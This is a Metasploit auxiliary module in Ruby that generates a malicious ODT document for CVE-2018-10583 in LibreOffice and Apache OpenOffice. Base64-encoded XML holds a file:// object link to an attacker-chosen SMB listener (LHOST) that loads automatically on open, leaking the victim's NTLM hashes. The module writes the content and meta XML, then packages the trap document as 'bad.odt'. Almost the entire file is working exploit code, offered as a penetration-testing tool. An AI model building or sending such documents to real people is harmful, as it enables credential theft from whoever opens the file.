##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'base64'
require 'rex/zip'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::FILEFORMAT

  def initialize
    super(
      'Name'           => 'LibreOffice 6.03 /Apache OpenOffice 4.1.5 Malicious ODT File Generator',
      'Description'    => 'Generates a Malicious ODT File which can be used with auxiliary/server/capture/smb or similar to capture hashes.',
      'Author'         => 'Richard Davy - secureyourit.co.uk',
      'References'     =>
        [
          ['CVE', '2018-10583'],
          ['URL', 'https://secureyourit.co.uk/wp/2018/05/01/creating-malicious-odt-files/'],
        ],
      'DisclosureDate' => 'May 01 2018',
      'License'        => MSF_LICENSE

    )

    register_options([
    OptString.new('FILENAME', [true, 'Filename for the new document', 'bad.odt']),
    OptString.new('CREATOR', [true, 'Document author for new document', 'RD_PENTEST']),
    OptAddressLocal.new('LHOST', [true, 'IP Address of SMB Listener that the .odt document points to', ''])
  ])

  end

  def run
    begin
      #Display Status Messages
      print_status("Generating Malicious ODT File ")
      print_status("SMB Listener Address will be set to "+datastore['LHOST'])

      #Create File Content
      createfilecontent()
      #Create zip/odt with content
      createzip()
    end
  end

  def createfilecontent()
    begin
      #Malicious part of the file is content.xml which has a file:// link to given address

      #Create the content.xml file
      contentxml1="PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxvZmZpY2U6ZG9jdW1lbnQtY29udGVudCB4bWxuczpvZmZpY2U9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6b2ZmaWNlOjEuMCIgeG1sbnM6c3R5bGU9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6c3R5bGU6MS4wIiB4bWxuczp0ZXh0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnRleHQ6MS4wIiB4bWxuczp0YWJsZT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczp0YWJsZToxLjAiIHhtbG5zOmRyYXc9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6ZHJhd2luZzoxLjAiIHhtbG5zOmZvPSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnhzbC1mby1jb21wYXRpYmxlOjEuMCIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6bWV0YT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczptZXRhOjEuMCIgeG1sbnM6bnVtYmVyPSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOmRhdGFzdHlsZToxLjAiIHhtbG5zOnN2Zz0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpzdmctY29tcGF0aWJsZToxLjAiIHhtbG5zOmNoYXJ0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOmNoYXJ0OjEuMCIgeG1sbnM6ZHIzZD0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpkcjNkOjEuMCIgeG1sbnM6bWF0aD0iaHR0cDovL3d3dy53My5vcmcvMTk5OC9NYXRoL01hdGhNTCIgeG1sbnM6Zm9ybT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpmb3JtOjEuMCIgeG1sbnM6c2NyaXB0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnNjcmlwdDoxLjAiIHhtbG5zOm9vbz0iaHR0cDovL29wZW5vZmZpY2Uub3JnLzIwMDQvb2ZmaWNlIiB4bWxuczpvb293PSJodHRwOi8vb3Blbm9mZmljZS5vcmcvMjAwNC93cml0ZXIiIHhtbG5zOm9vb2M9Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA0L2NhbGMiIHhtbG5zOmRvbT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS94bWwtZXZlbnRzIiB4bWxuczp4Zm9ybXM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDIveGZvcm1zIiB4bWxuczp4c2Q9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiB4bWxuczpycHQ9Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA1L3JlcG9ydCIgeG1sbnM6b2Y9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6b2Y6MS4yIiB4bWxuczp4aHRtbD0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIgeG1sbnM6Z3JkZGw9Imh0dHA6Ly93d3cudzMub3JnLzIwMDMvZy9kYXRhLXZpZXcjIiB4bWxuczpvZmZpY2Vvb289Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA5L29mZmljZSIgeG1sbnM6dGFibGVvb289Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA5L3RhYmxlIiB4bWxuczpkcmF3b29vPSJodHRwOi8vb3Blbm9mZmljZS5vcmcvMjAxMC9kcmF3IiB4bWxuczpjYWxjZXh0PSJ1cm46b3JnOmRvY3VtZW50Zm91bmRhdGlvbjpuYW1lczpleHBlcmltZW50YWw6Y2FsYzp4bWxuczpjYWxjZXh0OjEuMCIgeG1sbnM6bG9leHQ9InVybjpvcmc6ZG9jdW1lbnRmb3VuZGF0aW9uOm5hbWVzOmV4cGVyaW1lbnRhbDpvZmZpY2U6eG1sbnM6bG9leHQ6MS4wIiB4bWxuczpmaWVsZD0idXJuOm9wZW5vZmZpY2U6bmFtZXM6ZXhwZXJpbWVudGFsOm9vby1tcy1pbnRlcm9wOnhtbG5zOmZpZWxkOjEuMCIgeG1sbnM6Zm9ybXg9InVybjpvcGVub2ZmaWNlOm5hbWVzOmV4cGVyaW1lbnRhbDpvb3htbC1vZGYtaW50ZXJvcDp4bWxuczpmb3JtOjEuMCIgeG1sbnM6Y3NzM3Q9Imh0dHA6Ly93d3cudzMub3JnL1RSL2NzczMtdGV4dC8iIG9mZmljZTp2ZXJzaW9uPSIxLjIiPjxvZmZpY2U6c2NyaXB0cy8+PG9mZmljZTpmb250LWZhY2UtZGVjbHM+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMdWNpZGEgU2FuczEiIHN2Zzpmb250LWZhbWlseT0iJmFwb3M7THVjaWRhIFNhbnMmYXBvczsiIHN0eWxlOmZvbnQtZmFtaWx5LWdlbmVyaWM9InN3aXNzIi8+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMaWJlcmF0aW9uIFNlcmlmIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO0xpYmVyYXRpb24gU2VyaWYmYXBvczsiIHN0eWxlOmZvbnQtZmFtaWx5LWdlbmVyaWM9InJvbWFuIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iTGliZXJhdGlvbiBTYW5zIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO0xpYmVyYXRpb24gU2FucyZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3dpc3MiIHN0eWxlOmZvbnQtcGl0Y2g9InZhcmlhYmxlIi8+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMdWNpZGEgU2FucyIgc3ZnOmZvbnQtZmFtaWx5PSImYXBvcztMdWNpZGEgU2FucyZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iTWljcm9zb2Z0IFlhSGVpIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO01pY3Jvc29mdCBZYUhlaSZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iU2ltU3VuIiBzdmc6Zm9udC1mYW1pbHk9IlNpbVN1biIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjwvb2ZmaWNlOmZvbnQtZmFjZS1kZWNscz48b2ZmaWNlOmF1dG9tYXRpYy1zdHlsZXM+PHN0eWxlOnN0eWxlIHN0eWxlOm5hbWU9ImZyMSIgc3R5bGU6ZmFtaWx5PSJncmFwaGljIiBzdHlsZTpwYXJlbnQtc3R5bGUtbmFtZT0iT0xFIj48c3R5bGU6Z3JhcGhpYy1wcm9wZXJ0aWVzIHN0eWxlOmhvcml6b250YWwtcG9zPSJjZW50ZXIiIHN0eWxlOmhvcml6b250YWwtcmVsPSJwYXJhZ3JhcGgiIGRyYXc6b2xlLWRyYXctYXNwZWN0PSIxIi8+PC9zdHlsZTpzdHlsZT48L29mZmljZTphdXRvbWF0aWMtc3R5bGVzPjxvZmZpY2U6Ym9keT48b2ZmaWNlOnRleHQ+PHRleHQ6c2VxdWVuY2UtZGVjbHM+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJJbGx1c3RyYXRpb24iLz48dGV4dDpzZXF1ZW5jZS1kZWNsIHRleHQ6ZGlzcGxheS1vdXRsaW5lLWxldmVsPSIwIiB0ZXh0Om5hbWU9IlRhYmxlIi8+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJUZXh0Ii8+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJEcmF3aW5nIi8+PC90ZXh0OnNlcXVlbmNlLWRlY2xzPjx0ZXh0OnAgdGV4dDpzdHlsZS1uYW1lPSJTdGFuZGFyZCIvPjx0ZXh0OnAgdGV4dDpzdHlsZS1uYW1lPSJTdGFuZGFyZCI+PGRyYXc6ZnJhbWUgZHJhdzpzdHlsZS1uYW1lPSJmcjEiIGRyYXc6bmFtZT0iT2JqZWN0MSIgdGV4dDphbmNob3ItdHlwZT0icGFyYWdyYXBoIiBzdmc6d2lkdGg9IjE0LjEwMWNtIiBzdmc6aGVpZ2h0PSI5Ljk5OWNtIiBkcmF3OnotaW5kZXg9IjAiPjxkcmF3Om9iamVjdCB4bGluazpocmVmPSJmaWxlOi8v"
      contentxml2=datastore['LHOST']
      contentxml3="L3Rlc3QuanBnIiB4bGluazp0eXBlPSJzaW1wbGUiIHhsaW5rOnNob3c9ImVtYmVkIiB4bGluazphY3R1YXRlPSJvbkxvYWQiLz48ZHJhdzppbWFnZSB4bGluazpocmVmPSIuL09iamVjdFJlcGxhY2VtZW50cy9PYmplY3QgMSIgeGxpbms6dHlwZT0ic2ltcGxlIiB4bGluazpzaG93PSJlbWJlZCIgeGxpbms6YWN0dWF0ZT0ib25Mb2FkIi8+PC9kcmF3OmZyYW1lPjwvdGV4dDpwPjwvb2ZmaWNlOnRleHQ+PC9vZmZpY2U6Ym9keT48L29mZmljZTpkb2N1bWVudC1jb250ZW50Pg=="

      #Write content.xml out to disk
      open((File.join(Msf::Config.install_root, 'data', 'exploits', 'badodt','content.xml')), 'w') { |f|
        f.puts (Base64.decode64(contentxml1)+contentxml2+Base64.decode64(contentxml3))
        f.close
      }

      #Create the content for meta.xml
      metaxml1="PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxvZmZpY2U6ZG9jdW1lbnQtbWV0YSB4bWxuczpvZmZpY2U9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6b2ZmaWNlOjEuMCIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6bWV0YT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczptZXRhOjEuMCIgeG1sbnM6b29vPSJodHRwOi8vb3Blbm9mZmljZS5vcmcvMjAwNC9vZmZpY2UiIHhtbG5zOmdyZGRsPSJodHRwOi8vd3d3LnczLm9yZy8yMDAzL2cvZGF0YS12aWV3IyIgb2ZmaWNlOnZlcnNpb249IjEuMiI+PG9mZmljZTptZXRhPjxtZXRhOmluaXRpYWwtY3JlYXRvcj4="
      metaxml2="PC9tZXRhOmluaXRpYWwtY3JlYXRvcj48bWV0YTpjcmVhdGlvbi1kYXRlPjIwMTctMDItMDZUMTU6MTU6NDcuMzU8L21ldGE6Y3JlYXRpb24tZGF0ZT48ZGM6ZGF0ZT4yMDE3LTAyLTA2VDE1OjIxOjU5LjY0PC9kYzpkYXRlPjxkYzpjcmVhdG9yPg=="
      metaxml3="PC9kYzpjcmVhdG9yPjxtZXRhOmVkaXRpbmctZHVyYXRpb24+UFQ0TTE2UzwvbWV0YTplZGl0aW5nLWR1cmF0aW9uPjxtZXRhOmVkaXRpbmctY3ljbGVzPjI8L21ldGE6ZWRpdGluZy1jeWNsZXM+PG1ldGE6Y3JlYXRpb24tZGF0ZT4yMDE4LTA1LTEwVDIwOjI5OjQxLjM5ODAwMDAwMDwvbWV0YTpjcmVhdGlvbi1kYXRlPjxtZXRhOmRvY3VtZW50LXN0YXRpc3RpYyBtZXRhOnRhYmxlLWNvdW50PSIwIiBtZXRhOmltYWdlLWNvdW50PSIwIiBtZXRhOm9iamVjdC1jb3VudD0iMCIgbWV0YTpwYWdlLWNvdW50PSIxIiBtZXRhOnBhcmFncmFwaC1jb3VudD0iMCIgbWV0YTp3b3JkLWNvdW50PSIwIiBtZXRhOmNoYXJhY3Rlci1jb3VudD0iMCIgbWV0YTpub24td2hpdGVzcGFjZS1jaGFyYWN0ZXItY291bnQ9IjAiLz48bWV0YTpnZW5lcmF0b3I+TGlicmVPZmZpY2UvNi4wLjMuMiRXaW5kb3dzX1g4Nl82NCBMaWJyZU9mZmljZV9wcm9qZWN0LzhmNDhkNTE1NDE2NjA4ZTNhODM1MzYwMzE0ZGFjN2U0N2ZkMGI4MjE8L21ldGE6Z2VuZXJhdG9yPjwvb2ZmaWNlOm1ldGE+PC9vZmZpY2U6ZG9jdW1lbnQtbWV0YT4="
      creator=datastore['CREATOR']

      #Write meta.xml out to disk
      open((File.join(Msf::Config.install_root, 'data', 'exploits', 'badodt','meta.xml')), 'w') { |f|
        f.puts (Base64.decode64(metaxml1)+creator+Base64.decode64(metaxml2)+creator+Base64.decode64(metaxml3))
        f.close
      }

    end
  end

  def createzip()
    begin

      files =
      [
        {data: File.read(File.join(Msf::Config.install_root, 'data', 'exploits', 'badodt','content.xml')), fname: 'content.xml'},
        {data: File.read(File.join(Msf::Config.install_root, 'data', 'exploits', 'badodt','manifest.rdf')), fname: 'manifest.rdf'},
        {data: File.read(File.join(Msf::Config.install_root, 'data', 'exploits', 'badodt','meta.xml')), fname: 'meta.xml'},
        {data: File.read(File.join(Msf::Config.install_root, 'data', 'exploits', 'badodt','settings.xml')), fname: 'settings.xml'},
        {data: File.read(File.join(Msf::Config.install_root, 'data', 'exploits', 'badodt','styles.xml')), fname: 'styles.xml'},
        {data: File.read(File.join(Msf::Config.install_root, 'data', 'exploits', 'badodt','manifest.xml')), fname: 'META-INF/manifest.xml'},
        {data: File.read(File.join(Msf::Config.install_root, 'data', 'exploits', 'badodt','thumbnail.png')), fname: 'Thumbnails/thumbnail.png'}
      ]

      zip = Msf::Util::EXE.to_zip(files)

      file_create(zip)

    end
  end
end
